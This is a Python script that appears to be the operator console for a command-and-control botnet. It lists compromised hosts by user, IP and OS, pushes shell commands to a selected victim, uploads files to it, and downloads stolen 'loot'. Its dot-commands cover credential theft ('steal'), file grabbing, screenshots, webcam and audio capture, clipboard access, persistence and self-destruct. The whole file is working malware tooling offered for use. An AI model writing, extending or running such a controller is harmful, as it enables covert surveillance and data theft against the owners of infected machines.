#!/usr/bin/env python3
import sys, os, json, time, argparse, urllib.request, base64

ap = argparse.ArgumentParser()
ap.add_argument("--url", required=True)
ap.add_argument("--key", required=True)
g = ap.parse_args()
U = g.url.rstrip("/"); H = {"X-Auth": g.key}
cur = None; seq = 0

def api(p, data=None, hdr=None, raw=False):
    h = dict(H); h.update(hdr or {})
    r = urllib.request.Request(U + p, data=data, headers=h)
    with urllib.request.urlopen(r, timeout=90) as f: return f.read() if raw else f.read().decode()

def pr(): sys.stdout.write(("\033[92m[%s]\033[0m> " % cur) if cur else "\033[96mc2\033[0m> "); sys.stdout.flush()

def show():
    global seq
    while cur:
        try:
            j = json.loads(api("/api/out?sid=%s&after=%d" % (cur, seq)))
            if j["lines"]:
                seq = j["seq"]; sys.stdout.write("".join(j["lines"])); sys.stdout.flush()
        except Exception: pass
        time.sleep(0.4)

def main():
    global cur, seq
    os.makedirs(os.path.expanduser("~/loot"), exist_ok=True)
    while True:
        pr(); line = sys.stdin.readline()
        if not line: break
        line = line.rstrip("\n")
        if not line: continue
        try:
            if not cur:
                c = line.split()
                if c[0] in ("ls", "list"):
                    for s in json.loads(api("/api/sessions")):
                        print("%s %-6s %s@%s %s %s" % ("*" if s["on"] else "-", s["id"],
                              s["user"], s["host"], s["ip"], s["os"]))
                elif c[0] == "in" and len(c) > 1: cur = c[1]; seq = 0
                elif c[0] == "loot":
                    for f in json.loads(api("/api/loot")): print(f["id"], f["size"], f["name"])
                elif c[0] == "dl" and len(c) > 1:
                    d = api("/api/loot/" + c[1], raw=True)
                    p = os.path.expanduser("~/loot/" + c[1] + ".bin"); open(p, "wb").write(d)
                    print("saved", p, len(d))
                elif c[0] in ("q", "exit"): break
                else: print("ls | in <id> | loot | dl <fid> | q")
                continue
            if not line.startswith("."):
                api("/api/cmd", json.dumps({"sid": cur, "cmd": line}).encode(),
                    {"Content-Type": "application/json"})
                continue
            b = line[1:].split(None, 1); c = b[0]; a = b[1] if len(b) > 1 else ""
            if c == "leave": cur = None
            elif c == "get": api("/api/cmd", json.dumps({"sid": cur, "cmd": ".get " + a}).encode())
            elif c == "shot": api("/api/cmd", json.dumps({"sid": cur, "cmd": ".shot"}).encode())
            elif c == "put":
                d = open(a, "rb").read()
                api("/api/put", d, {"X-Sid": cur, "X-Name": os.path.basename(a)})
                print("sent", len(d), "bytes")
            elif c == "loot":
                for f in json.loads(api("/api/loot")): print(f["id"], f["size"], f["name"])
            elif c == "dl" and a:
                d = api("/api/loot/" + a, raw=True)
                p = os.path.expanduser("~/loot/" + a + ".bin"); open(p, "wb").write(d); print("saved", p)
            else:
                m = {"leave": "", "cd": ".cd ", "ls": ".ls ", "steal": ".steal",
                     "grab": ".grab ", "info": ".info", "ps": ".ps", "cam": ".cam",
                     "audio": ".audio ", "persist": ".persist", "unpersist": ".unpersist",
                     "sd": ".sd", "py": ".py ", "clip": ".clip "}
                cmd = m.get(c)
                if cmd is None: print("dot: leave cd ls get put shot steal grab info ps cam audio persist unpersist sd py clip loot dl")
                else: api("/api/cmd", json.dumps({"sid": cur, "cmd": cmd + a}).encode())
        except Exception as e:
            print("ERR", e)

main()
